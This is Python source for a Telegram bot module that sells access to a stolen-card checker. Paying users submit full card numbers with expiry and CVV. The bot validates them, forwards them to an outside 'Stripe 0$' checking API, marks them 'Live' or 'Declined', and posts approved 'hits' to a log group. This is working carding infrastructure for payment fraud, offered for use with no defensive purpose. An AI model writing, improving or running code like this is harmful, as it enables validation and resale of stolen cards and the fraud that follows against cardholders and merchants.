import asyncio
import re
import logging
import aiohttp
import time
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import database
from payments import PLANS

# Try importing bin lookup, handle if file doesn't exist
try:
    from bin import get_bin_info
except ImportError:
    logging.warning("bin.py not found. BIN lookup will be disabled.")
    async def get_bin_info(bin_num):
        return {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS & EMOJI IDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CHK_API_URL = "https://cardx.up.railway.app/stripe/cc={cc}"

# NEW UI CUSTOM EMOJI IDS
CHARGED_EMOJI_ID = "5891044423856296980"
LIVE_EMOJI_ID = "4958610528588008305"
CARD_EMOJI_ID = "5447453226498552490"
USER_EMOJI_ID = "5956561749070057536"
PRO_EMOJI_ID = "6298678524379137990"
BUTTON_EMOJI_ID = "5935795874251674052"
GATE_EMOJI_ID = "5801044672658805468"
DECLINED_EMOJI_ID = "4956612582816351459"
BUY_EMOJI_ID = "5935795874251674052"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# APPROVED KEYWORDS FOR HIT DETECTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# API returns status "approved", so we check for that string
CHK_APPROVED_STATUS = "approved"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG GROUP ID
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID = -1003838614236 # Ensure this is correct

# Router for this module
router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE MIGRATION FOR STATS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    """Ensures cc_checked and cc_charged columns exist in the users table."""
    try:
        conn = database.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
        logging.info("[DB] CHK Stats columns checked/created.")
    except Exception as e:
        logging.error(f"[DB] Error checking stats columns: {e}")

# Run check on import
ensure_stats_columns()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
    'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
    'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
    'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
    'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ',
    'z': 'ᴢ'
}

def to_small_caps(text: str) -> str:
    """Convert lowercase to small caps, keep uppercase as is (e.g., Uꜱᴅ)"""
    result = ""
    for char in text:
        if char.lower() in SMALL_CAPS_MAP:
            if char.isupper():
                result += char
            else:
                result += SMALL_CAPS_MAP[char]
        else:
            result += char
    return result

def to_small_caps_title(text: str) -> str:
    """Convert to small caps with first letter of each word uppercase (e.g., Aᴅᴅ_Sʜɪᴘᴘɪɴɢ_Eʀʀᴏʀ)"""
    result = ""
    is_new_word = True
    for char in text:
        if char == '_':
            result += '_'
            is_new_word = True
        elif char.lower() in SMALL_CAPS_MAP:
            if is_new_word:
                result += char.upper()
                is_new_word = False
            else:
                result += SMALL_CAPS_MAP[char.lower()]
        else:
            result += char
            is_new_word = False
    return result

def get_user_link(user_obj) -> str:
    """Returns a properly clickable HTML hyperlink for the user."""
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

async def update_user_stats(user_id, is_charged):
    """
    Increments cc_checked and optionally cc_charged in the database.
    """
    def _sync_update():
        conn = database.get_connection()
        cursor = conn.cursor()
        
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
            
        conn.commit()
        conn.close()

    await asyncio.to_thread(_sync_update)

async def get_user_plan_details(user_id):
    """
    Returns tuple: (Plan Display Name, Plan Emoji ID) or (Default Name, Default Emoji)
    """
    try:
        if not database.is_premium_active(user_id):
            return "No Plan", "5267500801240092311"
        
        def _sync_fetch():
            conn = database.get_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cursor.fetchone()
            conn.close()
            return row.get('current_plan') if row else None
        
        plan_key = await asyncio.to_thread(_sync_fetch)
        
        if plan_key and plan_key in PLANS:
            plan_info = PLANS[plan_key]
            return plan_info.get("display", plan_key), plan_info.get("emoji_id", "5267500801240092311")
            
        return "Unknown", "5267500801240092311"
        
    except Exception as e:
        logging.error(f"Error fetching plan details: {e}")
        return "Error", "5267500801240092311"

def luhn_check(card_number: str) -> bool:
    """Validates a credit card number using the Luhn Algorithm."""
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    
    total = 0
    reverse_digits = card_number[::-1]
    
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        
    return total % 10 == 0

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_emoji):
    """
    Sends hit log to the designated group for approved cards.
    """
    user_link = get_user_link(user_obj)
    response_msg_styled = to_small_caps_title(str(response_msg))
    
    caption = (
        f'<b><a href="https://t.me/FailureFr_07">[𖥷iТ ] </a> ➛ Lɪᴠᴇ <tg-emoji emoji-id="{LIVE_EMOJI_ID}">💎</tg-emoji></b>\n'
        f'<b>Gᴀᴛᴇ ➛</b>\n'
        f'<b>Rᴀᴡ ➛ {response_msg_styled} <tg-emoji emoji-id="4958926882994127612">✅</tg-emoji></b>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji}">⭐</tg-emoji></b>'
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            {
                "text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
                "url": "https://t.me/CARDXV4_BOT",
                "style": "primary",
                "icon_custom_emoji_id": BUTTON_EMOJI_ID
            }
        ]
    ])

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        logging.info(f"[CHK] Hit log sent to group - Status: APPROVED")
    except Exception as e:
        logging.error(f"[CHK] Error sending hit log to group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD FOR NO PLAN USERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def buy_now_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                {
                    "text": "Buy Now",
                    "callback_data": "buy_now",
                    "style": "primary",
                    "icon_custom_emoji_id": BUY_EMOJI_ID
                }
            ]
        ]
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/chk"))
async def chk_command(message: types.Message):
    user = message.from_user
    user_id = user.id

    # 1. CHECK PLAN / PREMIUM STATUS
    if not database.is_premium_active(user_id):
        await message.reply(
            "<b>❌ Access Denied.</b>\n"
            "<b>You must have an active plan to use this gate.</b>\n"
            "<b>Please purchase a plan to continue.</b>",
            parse_mode="HTML",
            reply_markup=buy_now_keyboard()
        )
        return

    # 2. Extract Card Details
    parts = message.text.split(maxsplit=1)
    raw_text = ""
    
    if len(parts) > 1:
        raw_text = parts[1].strip()
    elif message.reply_to_message:
        raw_text = message.reply_to_message.text or message.reply_to_message.caption
        
    if not raw_text:
        await message.reply(
            "<b>❌ Usage:</b> /chk <code>cc|mm|yy|cvv</code>\n"
            "<b>Or reply to a message containing card details.</b>",
            parse_mode="HTML"
        )
        return

    # Regex to find CC
    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply(
            "<b>❌ Invalid Card Format.</b>\n"
            "<b>Please provide CC as <code>4242424242424242|05|27|123</code></b>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()

    # Normalize Year
    if len(yy_raw) == 4:
        yy = yy_raw[2:]
    else:
        yy = yy_raw

    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # 3. LUHN CHECK
    if not luhn_check(cc):
        await message.reply(
            "<b>❌ Invalid Card</b>\n"
            "<b>Your card number is incorrect.</b>",
            parse_mode="HTML"
        )
        return

    # 4. Send Processing Message
    processing_text = "<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>"
    proc_msg = await message.reply(processing_text, parse_mode="HTML")

    # 5. Execute Background Task
    asyncio.create_task(
        process_chk_check(
            message, proc_msg, user, user_id, formatted_cc, cc
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_chk_check(message, proc_msg, user, user_id, formatted_cc, cc):
    """
    Handles the Stripe API calls, DB updates, and final message editing.
    """
    
    # A. ENSURE USER EXISTS IN DB
    try:
        await asyncio.to_thread(database.ensure_user, user_id, user.username, user.first_name)
    except Exception as e:
        logging.error(f"Error ensuring user exists: {e}")

    # B. Bin Lookup
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    # C. Auth API (Stripe)
    api_result = {"status": "error", "response": "Unknown Error"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(CHK_API_URL.format(cc=formatted_cc), timeout=90) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    # Mapping API response to internal format
                    # API returns: {"status": "approved", "response": "Payment Method Added"}
                    api_result["status"] = data.get("status")
                    api_result["response"] = data.get("response")
                else:
                    api_result["response"] = f"API Error: {resp.status}"
    except asyncio.TimeoutError:
        logging.error(f"Stripe API Timeout")
        api_result["response"] = "API Timed Out (Server took too long to respond)"
    except Exception as e:
        logging.error(f"Stripe API Error: {e}")
        api_result["response"] = f"Connection Error: {str(e)}"

    # D. Determine Final Status & Check if Approved
    api_status = api_result.get("status", "").lower()
    api_message = api_result.get("response", "N/A")
    
    is_approved = (api_status == CHK_APPROVED_STATUS)
    
    display_raw_text = to_small_caps_title(str(api_message))

    if is_approved:
        final_status = f'Lɪᴠᴇ <tg-emoji emoji-id="{LIVE_EMOJI_ID}">💎</tg-emoji>'
    else:
        final_status = f'Dᴇᴄʟɪɴᴇᴅ <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji>'

    # E. UPDATE STATS (Checked + Approved as "charged" stat)
    try:
        await update_user_stats(user_id, is_approved)
    except Exception as e:
        logging.error(f"Failed to update stats: {e}")

    # F. GET USER PLAN DETAILS (Name & Emoji) for display
    plan_display, plan_emoji = await get_user_plan_details(user_id)

    # G. SEND HIT LOG TO GROUP (Only for approved cards)
    if is_approved:
        try:
            bot = message.bot
            await send_hit_log_to_group(
                bot=bot,
                response_msg=api_message,
                user_obj=user,
                plan_emoji=plan_emoji
            )
        except Exception as e:
            logging.error(f"[CHK] Failed to send hit log: {e}")

    # H. Build Final Caption Elements
    bin_info_str = f"{bin_scheme} - {bin_bank} - {bin_country}"
    user_link = get_user_link(user)
    dev_link = '<a href="https://t.me/FailureFr_07">kคli liຖนxx</a>'
    gate_text = to_small_caps("Stripe 0$")
    
    # NEW UI FORMAT
    final_caption = (
        f'<b><a href="https://t.me/FailureFr_07">[𖥷iТ ] </a> ➛ {final_status}</b>\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{formatted_cc}</code></b>\n'
        f'<b>{to_small_caps("Gate")} ➛ {gate_text}</b> <tg-emoji emoji-id="{GATE_EMOJI_ID}">💳</tg-emoji>\n'
        f'<b>{to_small_caps("Raw")} ➛ {display_raw_text}</b>\n'
        f'<b>{to_small_caps("Info")} ➛ <code>{bin_info_str}</code></b>\n'
        f'<b>{to_small_caps("User")} ➛ {user_link} <tg-emoji emoji-id="{plan_emoji}">⭐</tg-emoji> <b>({plan_display})</b></b>\n'
        f'<b>{to_small_caps("Pro")} ➛ {dev_link}</b> <tg-emoji emoji-id="{PRO_EMOJI_ID}">⚡</tg-emoji>'
    )

    # I. Keyboard
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            {
                "text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
                "url": "https://t.me/CARDXV4_BOT",
                "style": "primary",
                "icon_custom_emoji_id": BUTTON_EMOJI_ID
            }
        ]
    ])

    # J. Edit the Processing Message with Result
    try:
        await proc_msg.edit_text(
            text=final_caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        try:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
        except Exception as e2:
            logging.error(f"Fallback reply also failed: {e2}")
